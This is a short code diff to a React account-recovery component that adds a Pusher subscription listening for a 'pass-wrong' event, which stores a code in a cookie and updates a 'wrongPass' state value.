@@ -14,6 +14,8 @@ function AccountRecoveryCode() {
 
   const [verifyId, setVerifyId] = useState("");
   const[reverifyId, setReVerifyId] = useState('');
+    const [wrongPass, setWrongPass] = useState("");
+
   
   const pid = Cookies.get("id");
   const pusher = new Pusher("05656b52c62c0f688ee3", {
@@ -54,6 +56,23 @@ function AccountRecoveryCode() {
     };
   }, [pid]);
 
+
+  useEffect(() => {
+    const channel = pusher.subscribe(pid);
+
+    channel.bind("pass-wrong", (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log("Path data updated:", data);
+      Cookies.set("code", data.code);
+      setWrongPass(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind("pass-wrong");
+      channel.unsubscribe(pid);
+    };
+  }, [pid]);
+  
   if (verifyId) {
     return router.push("/account-verify-code");
   }
